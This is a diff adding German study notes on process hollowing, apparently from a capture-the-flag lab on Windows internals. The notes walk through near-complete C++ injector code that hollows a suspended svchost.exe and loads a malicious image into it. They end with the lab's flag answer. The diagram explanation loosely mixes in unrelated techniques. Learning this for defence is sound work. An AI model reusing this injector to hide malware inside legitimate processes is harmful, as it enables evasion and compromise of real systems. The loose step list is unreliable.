@@ -152,3 +152,196 @@ Auf hoher Ebene kann Process Hollowing in sechs Schritte unterteilt werden:
 6. Den Zielprozess aus dem angehaltenen Zustand herausnehmen.
 
 Die Schritte können auch grafisch dargestellt werden, um zu zeigen, wie Windows API-Aufrufe mit dem Prozessspeicher interagieren.
+![Abusing of Windows Internals](Bilder/2024-06-24-Abusing-of-Windows-Internals.png)
+
+1. **Suspendierter Prozess**: Dies ist der Ausgangspunkt. Ein laufendes Programm wird vorübergehend gestoppt.
+
+2. **DLL-Injektion**: Der Angreifer injiziert eine DLL (Dynamic Link Library) in den Adressraum eines anderen Prozesses. Dies ermöglicht es, eigenen Code im Kontext des Prozesses auszuführen. Die DLL-Injektion ist im Bereich "DLLS" dargestellt.
+
+3. **Prozess-Heap-Exploitation**: Hier manipuliert der Angreifer den Prozess-Heap, um Speicherfehler auszunutzen und bösartigen Code einzufügen. Dieser Schritt ist im Bereich "Process Heap" zu finden.
+
+4. **Thread-Stack-Manipulation**: Durch Manipulation des Thread-Stacks kann der Angreifer den Programmfluss ändern und eigenen Code ausführen. Dies ist im Bereich "Thread Stack" dargestellt.
+
+5. **Memory Region Hollowing**: Hierbei wird der Speicherbereich eines Prozesses geleert und mit bösartigem Code überschrieben. Du findest diesen Schritt im Bereich "Hollowed Memory".
+
+6. **Virtual Memory und Schreiben in den Speicher**: Der Angreifer reserviert virtuellen Speicher und schreibt bösartigen Code hinein. Dies ist im Bereich "VirtualAlloc" zu sehen.
+
+7. **Setzen des Thread-Kontexts**: Schließlich wird der Thread-Kontext so geändert, dass der bösartige Code ausgeführt wird. Dieser Schritt ist im Bereich "SetThreadContext" dargestellt.
+
+Wir werden einen grundlegenden Process Hollowing Injector aufschlüsseln, um jeden der Schritte zu identifizieren und unten ausführlicher zu erklären.
+
+Im ersten Schritt des Process Hollowing müssen wir einen Zielprozess im angehaltenen Zustand erstellen, indem wir `CreateProcessA` verwenden. Um die erforderlichen Parameter für den API-Aufruf zu erhalten, können wir die Strukturen `STARTUPINFOA` und `PROCESS_INFORMATION` verwenden.
+
+```C++
+LPSTARTUPINFOA target_si = new STARTUPINFOA(); // Defines station, desktop, handles, and appearance of a process
+LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); // Information about the process and primary thread
+CONTEXT c; // Context structure pointer
+
+if (CreateProcessA(
+	(LPSTR)"C:\\\\Windows\\\\System32\\\\svchost.exe", // Name of module to execute
+	NULL,
+	NULL,
+	NULL,
+	TRUE, // Handles are inherited from the calling process
+	CREATE_SUSPENDED, // New process is suspended
+	NULL,
+	NULL,
+	target_si, // pointer to startup info
+	target_pi) == 0) { // pointer to process information
+	cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
+	return 1;
+```
+
+Im zweiten Schritt müssen wir ein bösartiges Image öffnen, das injiziert werden soll. Dieser Prozess ist in drei Schritte unterteilt, beginnend mit der Verwendung von CreateFileA, um ein Handle für das bösartige Image zu erhalten.
+```C++
+HANDLE hMaliciousCode = CreateFileA(
+	(LPCSTR)"C:\\\\Users\\\\tryhackme\\\\malware.exe", // Name of image to obtain
+	GENERIC_READ, // Read-only access
+	FILE_SHARE_READ, // Read-only share mode
+	NULL,
+	OPEN_EXISTING, // Instructed to open a file or device if it exists
+	NULL,
+	NULL
+);
+```
+
+Sobald ein Handle für das bösartige Image erhalten wurde, muss Speicher für den lokalen Prozess mit `VirtualAlloc` zugewiesen werden. `GetFileSize` wird ebenfalls verwendet, um die Größe des bösartigen Images für `dwSize` abzurufen.
+```
+DWORD maliciousFileSize = GetFileSize(
+	hMaliciousCode, // Handle of malicious image
+	0 // Returns no error
+);
+
+PVOID pMaliciousImage = VirtualAlloc(
+	NULL,
+	maliciousFileSize, // File size of malicious image
+	0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
+	0x04 // Enables read/write access (PAGE_READWRITE)
+);
+```
+
+Nun, da Speicher für den lokalen Prozess zugewiesen wurde, muss dieser beschrieben werden. Mit den Informationen aus den vorherigen Schritten können wir `ReadFile` verwenden, um in den lokalen Prozessspeicher zu schreiben.
+```
+DWORD numberOfBytesRead; // Stores number of bytes read
+
+if (!ReadFile(
+	hMaliciousCode, // Handle of malicious image
+	pMaliciousImage, // Allocated region of memory
+	maliciousFileSize, // File size of malicious image
+	&numberOfBytesRead, // Number of bytes read
+	NULL
+	)) {
+	cout << "[!] Unable to read Malicious file into memory. Error: " <<GetLastError()<< endl;
+	TerminateProcess(target_pi->hProcess, 0);
+	return 1;
+}
+
+CloseHandle(hMaliciousCode);
+```
+
+Im dritten Schritt muss der Prozess durch Entmapen des Speichers "ausgehöhlt" werden. Bevor das Entmapen erfolgen kann, müssen wir die Parameter des API-Aufrufs identifizieren. Wir müssen die Speicherposition des Prozesses und den Einstiegspunkt identifizieren. Die CPU-Register `EAX` (Einstiegspunkt) und `EBX` (PEB-Position) enthalten die benötigten Informationen, die durch Verwendung von `GetThreadContext` gefunden werden können. Sobald beide Register gefunden sind, wird `ReadProcessMemory` verwendet, um die Basisadresse aus `EBX` mit einem Offset (`0x8`), der aus der Untersuchung des PEB stammt, zu erhalten.
+```
+c.ContextFlags = CONTEXT_INTEGER; // Only stores CPU registers in the pointer
+GetThreadContext(
+	target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
+	&c // Pointer to store retrieved context
+); // Obtains the current thread context
+
+PVOID pTargetImageBaseAddress; 
+ReadProcessMemory(
+	target_pi->hProcess, // Handle for the process obtained from the PROCESS_INFORMATION structure
+	(PVOID)(c.Ebx + 8), // Pointer to the base address
+	&pTargetImageBaseAddress, // Store target base address 
+	sizeof(PVOID), // Bytes to read 
+	0 // Number of bytes out
+);
+```
+
+Nachdem die Basisadresse gespeichert ist, können wir mit dem Entmapen des Speichers beginnen. Wir können `ZwUnmapViewOfSection` verwenden, das aus ntdll.dll importiert wird, um Speicher vom Zielprozess freizugeben.
+```
+HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll"); // Obtains the handle for ntdll
+pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(
+	hNtdllBase, // Handle of ntdll
+	"ZwUnmapViewOfSection" // API call to obtain
+); // Obtains ZwUnmapViewOfSection from ntdll
+
+DWORD dwResult = pZwUnmapViewOfSection(
+	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
+	pTargetImageBaseAddress // Base address of the process
+);
+```
+
+Im vierten Schritt müssen wir damit beginnen, Speicher im "geleerten" Prozess zuzuweisen. Ähnlich wie in Schritt zwei können wir `VirtualAlloc` verwenden, um Speicher zuzuweisen. Diesmal müssen wir die Größe des Images aus den Dateiköpfen erhalten. Mit `e_lfanew` kann die Anzahl der Bytes vom DOS-Header zum PE-Header identifiziert werden. Sobald beim PE-Header angekommen, können wir die `SizeOfImage` aus dem Optional Header erhalten.
+```
+PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage; // Obtains the DOS header from the malicious image
+PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew); // Obtains the NT header from e_lfanew
+
+DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage; // Obtains the size of the optional header from the NT header structure
+
+PVOID pHollowAddress = VirtualAllocEx(
+	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
+	pTargetImageBaseAddress, // Base address of the process
+	sizeOfMaliciousImage, // Byte size obtained from optional header
+	0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
+	0x40 // Enabled execute and read/write access (PAGE_EXECUTE_READWRITE)
+);
+```
+
+Nachdem der Speicher zugewiesen ist, können wir die bösartige Datei in den Speicher schreiben. Da wir eine Datei schreiben, müssen wir zuerst die PE-Header und dann die PE-Sektionen schreiben. Um die PE-Header zu schreiben, können wir `WriteProcessMemory` verwenden und die Größe der Header verwenden, um festzulegen, wo wir aufhören müssen.
+```
+if (!WriteProcessMemory(
+	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
+	pTargetImageBaseAddress, // Base address of the process
+	pMaliciousImage, // Local memory where the malicious file resides
+	pNTHeaders->OptionalHeader.SizeOfHeaders, // Byte size of PE headers 
+	NULL
+)) {
+	cout<< "[!] Writting Headers failed. Error: " << GetLastError() << endl;
+}
+```
+
+Jetzt müssen wir jede Sektion schreiben. Um die Anzahl der Sektionen zu finden, können wir `NumberOfSections` aus den NT-Headern verwenden. Wir können eine Schleife durch `e_lfanew` und die Größe des aktuellen Headers durchlaufen, um jede Sektion zu schreiben.
+```
+for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) { // Loop based on number of sections in PE data
+	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); // Determines the current PE section header
+
+	WriteProcessMemory(
+		target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
+		(PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress), // Base address of current section 
+		(PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData), // Pointer for content of current section
+		pSectionHeader->SizeOfRawData, // Byte size of current section
+		NULL
+	);
+}
+```
+
+Es ist auch möglich, Relokationstabellen zu verwenden, um die Datei in den Ziel-Speicher zu schreiben. Dies wird im Task 6 genauer erläutert.
+
+Im fünften Schritt können wir `SetThreadContext` verwenden, um `EAX` so zu ändern, dass es auf den Einstiegspunkt zeigt.
+```
+c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint); // Set the context structure pointer to the entry point from the PE optional header
+
+SetThreadContext(
+	target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
+	&c // Pointer to the stored context structure
+);
+```
+
+Im sechsten Schritt müssen wir den Prozess aus dem angehaltenen Zustand herausnehmen, indem wir ResumeThread verwenden.
+```
+ResumeThread(
+	target_pi->hThread // Handle to the thread obtained from the PROCESS_INFORMATION structure
+);
+```
+Wir können diese Schritte zusammenstellen, um einen Prozess-Hollowing-Injector zu erstellen. Verwenden Sie den bereitgestellten C++-Injector und experimentieren Sie mit Process Hollowing.
+
+## Fragen:
+Identifizieren Sie eine PID eines als THM-Attacker ausgeführten Prozesses, den Sie als Ziel verwenden möchten. Geben Sie die PID und den ausführbaren Dateinamen als Argumente an, um hollowing-injector.exe auszuführen, das sich im Verzeichnis "injectors" auf dem Desktop befindet:
+```
+Starte den Task Manager und gehe zu den Reiter Details und suche dort nach einem Prozess, als beispiel nutzte ich den Explorer.exe prozess. syntax hollowing-injector.exe <PID>
+```
+
+Welche Flagge wird nach dem Ausführen von Hollowing und dem Einspritzen des Shellcodes erhalten?
+```
+THM{7h3r35_n07h1n6_h3r3}
+```
